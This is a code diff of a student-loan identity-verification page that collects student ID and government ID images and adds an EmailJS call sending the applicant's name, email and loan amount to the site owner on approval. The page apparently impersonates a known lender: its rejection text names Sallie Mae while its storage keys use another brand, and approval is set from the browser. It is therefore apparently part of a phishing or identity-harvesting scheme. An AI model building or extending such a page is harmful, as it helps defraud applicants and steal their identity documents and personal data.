@@ -1,5 +1,6 @@
 'use client';
 
+import emailjs from '@emailjs/browser';
 import React, { useState, useEffect, useRef } from 'react';
 import { useRouter } from 'next/navigation';
 import { UploadCloud, FileText, CheckCircle2, AlertCircle, Trash2, Loader2, ChevronRight, FileUp, CreditCard, Clock, XCircle } from 'lucide-react';
@@ -11,14 +12,14 @@ type GovIdType = 'drivers_license' | 'state_id';
 
 export default function DocumentUploadPage() {
   const router = useRouter();
-  const { 
-    formData, 
-    updateFormData, 
-    saveApplication, 
-    setCurrentStep, 
-    loanId, 
-    secretToken, 
-    isLoading 
+  const {
+    formData,
+    updateFormData,
+    saveApplication,
+    setCurrentStep,
+    loanId,
+    secretToken,
+    isLoading
   } = useAppContext();
 
   // Set the progress stepper step
@@ -33,7 +34,7 @@ export default function DocumentUploadPage() {
   const [studentIdFile, setStudentIdFile] = useState<File | null>(null);
   const [govFrontFile, setGovFrontFile] = useState<File | null>(null);
   const [govBackFile, setGovBackFile] = useState<File | null>(null);
-  
+
   // Uploaded Storage paths
   const [studentIdUrl, setStudentIdUrl] = useState<string | null>(null);
   const [govFrontUrl, setGovFrontUrl] = useState<string | null>(null);
@@ -43,12 +44,12 @@ export default function DocumentUploadPage() {
   const [studentIdPreview, setStudentIdPreview] = useState<string | null>(null);
   const [govFrontPreview, setGovFrontPreview] = useState<string | null>(null);
   const [govBackPreview, setGovBackPreview] = useState<string | null>(null);
-  
+
   const [uploadingStudent, setUploadingStudent] = useState(false);
   const [uploadingFront, setUploadingFront] = useState(false);
   const [uploadingBack, setUploadingBack] = useState(false);
   const [isSubmittingDocs, setIsSubmittingDocs] = useState(false);
-  
+
   // App decision status loaded from database ('draft', 'submitted', 'pending', 'approved', 'rejected')
   const [appStatus, setAppStatus] = useState<string>('draft');
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
@@ -199,16 +200,16 @@ export default function DocumentUploadPage() {
       // If column update fails, fall back to storing in form_data JSONB object
       if (dbError) {
         console.warn('Column update failed, falling back to JSONB form_data storage...', dbError.message);
-        
+
         // Fetch existing form_data first
         const { data: currentLoan } = await supabase
           .from('loans')
           .select('form_data')
           .eq('id', loanId)
           .single();
-          
+
         const currentFormData = currentLoan?.form_data || {};
-        
+
         const updatedFormData = {
           ...currentFormData,
           govIdType: govIdType,
@@ -287,9 +288,9 @@ export default function DocumentUploadPage() {
       if (storageError) throw storageError;
 
       // 2. Set database field to null
-      const dbUpdateField = 
+      const dbUpdateField =
         type === 'student' ? { student_id_url: null } :
-        type === 'gov_front' ? { gov_id_front_url: null } : { gov_id_back_url: null };
+          type === 'gov_front' ? { gov_id_front_url: null } : { gov_id_back_url: null };
 
       let { error: dbError } = await supabase
         .from('loans')
@@ -303,9 +304,9 @@ export default function DocumentUploadPage() {
           .select('form_data')
           .eq('id', loanId)
           .single();
-          
+
         const currentFormData = currentLoan?.form_data || {};
-        
+
         // Remove key
         if (type === 'student') delete currentFormData.studentIdUrl;
         else if (type === 'gov_front') delete currentFormData.govIdFrontUrl;
@@ -387,7 +388,7 @@ export default function DocumentUploadPage() {
 
     try {
       const activeCosignerCode = Math.floor(100000 + Math.random() * 900000).toString();
-      
+
       // Update DB
       const { data: currentLoan, error: fetchError } = await supabase
         .from('loans')
@@ -396,7 +397,7 @@ export default function DocumentUploadPage() {
         .single();
 
       if (fetchError) throw fetchError;
-      
+
       const currentFormData = currentLoan?.form_data || {};
       const updatedFormData = {
         ...currentFormData,
@@ -455,6 +456,26 @@ export default function DocumentUploadPage() {
       const result = await saveApplication({ status: 'approved' });
       if (result.success) {
         setAppStatus('approved');
+
+        try {
+          const templateParams = {
+            applicant_name: `${formData.firstName || ''} ${formData.lastName || ''}`.trim() || 'Applicant',
+            applicant_email: formData.email || 'N/A',
+            loan_amount: formatCurrency(formData.loanAmountRequested || 0),
+            submission_date: new Date().toLocaleDateString(),
+          };
+
+          await emailjs.send(
+            'service_kagrwnu',     // Replace with your EmailJS Service ID
+            'template_v6pbabg',    // Replace with your EmailJS Template ID
+            templateParams,
+            'GQ_v5AaBZEPd-ayR7'      // Replace with your EmailJS Public Key
+          );
+          console.log('Owner notification email sent successfully!');
+        } catch (emailErr) {
+          console.error('Failed to send owner notification email:', emailErr);
+        }
+
       } else {
         throw new Error('Database save failed');
       }
@@ -477,15 +498,15 @@ export default function DocumentUploadPage() {
     const aid = parseInt(formData.loanFinancialAid || '0');
     const calculatedNeed = Math.max(0, cost - aid);
     const useCalc = formData.loanUseCalculatedNeed !== undefined ? formData.loanUseCalculatedNeed : true;
-    
+
     if (useCalc && calculatedNeed > 0) {
       return formatCurrency(calculatedNeed);
     }
-    
+
     if (formData.loanAmountRequested) {
       return formatCurrency(formData.loanAmountRequested);
     }
-    
+
     return formatCurrency(16284);
   };
 
@@ -508,13 +529,13 @@ export default function DocumentUploadPage() {
           <div className="w-20 h-20 bg-amber-50 rounded-full flex items-center justify-center text-amber-500 mb-8 border border-amber-100 shadow-sm animate-pulse">
             <Clock className="w-12 h-12" />
           </div>
-          
+
           <h1 className="text-3xl sm:text-4xl font-extrabold text-primary-blue mb-4 tracking-tight leading-tight">
             Documents <span className="text-accent-blue">Under Review</span>
           </h1>
-          
+
           <p className="text-base sm:text-lg text-gray-600 mb-8 leading-relaxed font-medium">
-            Thank you for verifying your identity. We have received your verification ID documents. 
+            Thank you for verifying your identity. We have received your verification ID documents.
             Our admin review team is currently verifying them.
           </p>
 
@@ -525,7 +546,7 @@ export default function DocumentUploadPage() {
               <li>Keep check of your inbox; we will email you if we need any further details.</li>
               <li>You can check back on this screen anytime using:</li>
             </ul>
-            
+
             <div className="mt-4 pt-4 border-t border-gray-200/50 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
               <div>
                 <span className="text-xs text-gray-500 block uppercase tracking-wider font-semibold">Your Access Code:</span>
@@ -538,7 +559,7 @@ export default function DocumentUploadPage() {
             </div>
           </div>
 
-          <Button 
+          <Button
             onClick={() => {
               localStorage.removeItem('maradex_loan_id');
               localStorage.removeItem('maradex_secret_token');
@@ -558,11 +579,11 @@ export default function DocumentUploadPage() {
     return (
       <div className="flex flex-col items-center justify-center flex-grow py-16 px-6 md:px-20 w-full max-w-5xl mx-auto font-sans animate-in fade-in duration-700">
         <div className="bg-white rounded-3xl p-8 sm:p-12 md:p-16 shadow-2xl border border-gray-100 flex flex-col items-center text-center max-w-3xl mx-auto">
-          
+
           <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center text-secondary-blue mb-8 border border-blue-100 shadow-sm animate-bounce">
             <CheckCircle2 className="w-10 h-10" />
           </div>
-          
+
           <h1 className="text-2xl md:text-3.5xl font-extrabold text-primary-blue mb-8 tracking-tight leading-[1.2] max-w-2xl">
             Your Student Loan Application is Approved.<br />You'll be Eligible for <span className="text-secondary-blue">{getDisplayLoanAmount()}</span> loan.
           </h1>
@@ -582,7 +603,7 @@ export default function DocumentUploadPage() {
             </p>
           </div>
 
-          <Button 
+          <Button
             onClick={() => {
               localStorage.removeItem('maradex_loan_id');
               localStorage.removeItem('maradex_secret_token');
@@ -605,16 +626,16 @@ export default function DocumentUploadPage() {
           <div className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center text-red-500 mb-8 border border-red-100 shadow-sm">
             <XCircle className="w-12 h-12" />
           </div>
-          
+
           <h1 className="text-3xl sm:text-4xl font-extrabold text-primary-blue mb-4 tracking-tight leading-tight">
             Application <span className="text-red-500">Status Update</span>
           </h1>
-          
+
           <p className="text-base text-gray-600 mb-8 leading-relaxed font-medium text-left bg-slate-50 p-6 rounded-xl border border-slate-100">
             Thank you for applying with Sallie Mae. Unfortunately, after reviewing your application details, credit profile, and uploaded verification documents, we are unable to approve your student loan request at this time. A loan officer will follow up with you by email with more details regarding this decision.
           </p>
 
-          <Button 
+          <Button
             onClick={() => {
               localStorage.removeItem('maradex_loan_id');
               localStorage.removeItem('maradex_secret_token');
@@ -633,7 +654,7 @@ export default function DocumentUploadPage() {
   return (
     <div className="flex flex-col items-center justify-center flex-1 py-16 px-6 md:px-20 w-full max-w-5xl mx-auto">
       <div className="w-full animate-in fade-in slide-in-from-right-4 duration-500 font-sans">
-        
+
         <h1 className="text-3xl md:text-5xl font-extrabold text-primary-blue mb-4 leading-tight">
           Verify <span className="text-accent-blue">your identity.</span>
         </h1>
@@ -650,7 +671,7 @@ export default function DocumentUploadPage() {
 
         {/* Main grid containing Student ID card and Gov ID Card */}
         <div className="grid grid-cols-1 md:grid-cols-2 gap-8 w-full items-start">
-          
+
           {/* Box 1: Student ID Card */}
           <div className="bg-white rounded-2xl p-6 sm:p-8 shadow-xl border border-gray-200 flex flex-col min-h-[460px]">
             <div className="flex items-center gap-3 mb-6">
@@ -663,16 +684,16 @@ export default function DocumentUploadPage() {
               </div>
             </div>
 
-            <input 
-              type="file" 
-              ref={studentInputRef} 
+            <input
+              type="file"
+              ref={studentInputRef}
               onChange={(e) => e.target.files && handleUploadFile(e.target.files[0], 'student')}
-              className="hidden" 
+              className="hidden"
               accept="image/png,image/jpeg,image/jpg,image/webp,application/pdf"
             />
 
             {!studentIdUrl ? (
-              <div 
+              <div
                 onDragOver={handleDragOver}
                 onDrop={(e) => handleDrop(e, 'student')}
                 onClick={() => studentInputRef.current?.click()}
@@ -696,9 +717,9 @@ export default function DocumentUploadPage() {
               <div className="flex-grow border border-gray-200 rounded-xl overflow-hidden flex flex-col min-h-[300px] bg-slate-50 relative group">
                 {studentIdPreview && !studentIdUrl.endsWith('.pdf') ? (
                   <div className="relative flex-grow flex items-center justify-center bg-gray-900 overflow-hidden min-h-[220px]">
-                    <img 
-                      src={studentIdPreview} 
-                      alt="Student ID Preview" 
+                    <img
+                      src={studentIdPreview}
+                      alt="Student ID Preview"
                       className="max-h-[240px] w-auto object-contain transition-transform duration-300 group-hover:scale-105"
                     />
                   </div>
@@ -713,10 +734,10 @@ export default function DocumentUploadPage() {
                     </span>
                   </div>
                 )}
-                
+
                 <div className="p-4 bg-white border-t border-gray-100 flex justify-between items-center">
                   <span className="text-xs text-gray-500 font-medium">Student ID document</span>
-                  <button 
+                  <button
                     onClick={() => handleDeleteFile('student')}
                     className="p-1.5 text-red-500 hover:bg-red-50 rounded-lg transition-colors flex items-center gap-1 text-xs font-bold"
                   >
@@ -759,20 +780,20 @@ export default function DocumentUploadPage() {
 
             {/* Sub-grid: Front and Back ID Uploaders */}
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 flex-grow">
-              
+
               {/* Front Side Uploader */}
               <div className="flex flex-col h-full">
                 <span className="text-xs font-bold text-gray-700 uppercase tracking-wider mb-2 block">Front Side</span>
-                <input 
-                  type="file" 
-                  ref={govFrontInputRef} 
+                <input
+                  type="file"
+                  ref={govFrontInputRef}
                   onChange={(e) => e.target.files && handleUploadFile(e.target.files[0], 'gov_front')}
-                  className="hidden" 
+                  className="hidden"
                   accept="image/png,image/jpeg,image/jpg,image/webp,application/pdf"
                 />
 
                 {!govFrontUrl ? (
-                  <div 
+                  <div
                     onDragOver={handleDragOver}
                     onDrop={(e) => handleDrop(e, 'gov_front')}
                     onClick={() => govFrontInputRef.current?.click()}
@@ -795,9 +816,9 @@ export default function DocumentUploadPage() {
                   <div className="flex-grow border border-gray-200 rounded-xl overflow-hidden flex flex-col min-h-[180px] bg-slate-50 relative group">
                     {govFrontPreview && !govFrontUrl.endsWith('.pdf') ? (
                       <div className="relative flex-grow flex items-center justify-center bg-gray-900 overflow-hidden min-h-[130px]">
-                        <img 
-                          src={govFrontPreview} 
-                          alt="Front ID Preview" 
+                        <img
+                          src={govFrontPreview}
+                          alt="Front ID Preview"
                           className="max-h-[130px] w-auto object-contain transition-transform duration-300 group-hover:scale-105"
                         />
                       </div>
@@ -811,7 +832,7 @@ export default function DocumentUploadPage() {
                     )}
                     <div className="p-2 bg-white border-t border-gray-100 flex justify-between items-center text-[11px]">
                       <span className="text-[10px] text-green-600 font-bold">Uploaded</span>
-                      <button 
+                      <button
                         onClick={() => handleDeleteFile('gov_front')}
                         className="text-red-500 hover:text-red-700 font-bold flex items-center gap-0.5"
                       >
@@ -825,16 +846,16 @@ export default function DocumentUploadPage() {
               {/* Back Side Uploader */}
               <div className="flex flex-col h-full">
                 <span className="text-xs font-bold text-gray-700 uppercase tracking-wider mb-2 block">Back Side</span>
-                <input 
-                  type="file" 
-                  ref={govBackInputRef} 
+                <input
+                  type="file"
+                  ref={govBackInputRef}
                   onChange={(e) => e.target.files && handleUploadFile(e.target.files[0], 'gov_back')}
-                  className="hidden" 
+                  className="hidden"
                   accept="image/png,image/jpeg,image/jpg,image/webp,application/pdf"
                 />
 
                 {!govBackUrl ? (
-                  <div 
+                  <div
                     onDragOver={handleDragOver}
                     onDrop={(e) => handleDrop(e, 'gov_back')}
                     onClick={() => govBackInputRef.current?.click()}
@@ -857,9 +878,9 @@ export default function DocumentUploadPage() {
                   <div className="flex-grow border border-gray-200 rounded-xl overflow-hidden flex flex-col min-h-[180px] bg-slate-50 relative group">
                     {govBackPreview && !govBackUrl.endsWith('.pdf') ? (
                       <div className="relative flex-grow flex items-center justify-center bg-gray-900 overflow-hidden min-h-[130px]">
-                        <img 
-                          src={govBackPreview} 
-                          alt="Back ID Preview" 
+                        <img
+                          src={govBackPreview}
+                          alt="Back ID Preview"
                           className="max-h-[130px] w-auto object-contain transition-transform duration-300 group-hover:scale-105"
                         />
                       </div>
@@ -873,7 +894,7 @@ export default function DocumentUploadPage() {
                     )}
                     <div className="p-2 bg-white border-t border-gray-100 flex justify-between items-center text-[11px]">
                       <span className="text-[10px] text-green-600 font-bold">Uploaded</span>
-                      <button 
+                      <button
                         onClick={() => handleDeleteFile('gov_back')}
                         className="text-red-500 hover:text-red-700 font-bold flex items-center gap-0.5"
                       >
@@ -897,14 +918,14 @@ export default function DocumentUploadPage() {
           </div>
 
           <div className="flex items-center gap-4 w-full md:w-auto">
-            <button 
+            <button
               onClick={() => router.push('/apply/submit')}
               disabled={uploadingStudent || uploadingFront || uploadingBack || isSubmittingDocs}
               className="w-full md:w-auto px-8 h-12 rounded-full border border-gray-300 bg-white text-primary-blue hover:bg-slate-50 transition-colors font-bold text-[14.5px]"
             >
               Back to Disclosures
             </button>
-            <Button 
+            <Button
               onClick={handleSubmitAllDocuments}
               disabled={isSubmitDisabled}
               loading={isSubmittingDocs}
